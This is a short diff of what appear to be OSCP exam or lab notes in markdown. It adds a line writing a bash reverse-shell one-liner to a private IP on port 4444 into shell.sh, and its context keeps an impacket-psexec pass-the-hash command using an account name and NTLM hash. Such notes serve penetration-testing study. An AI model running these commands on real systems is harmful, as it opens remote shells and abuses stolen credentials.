@@ -5,6 +5,10 @@
 ```
 
 ```
+echo '/bin/bash -i >& /dev/tcp/192.168.45.178/4444 0>&1' > shell.sh
+```
+
+```
 impacket-psexec oscp.exam/tom_admin@10.10.162.154 -hashes aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dc
 ```
 
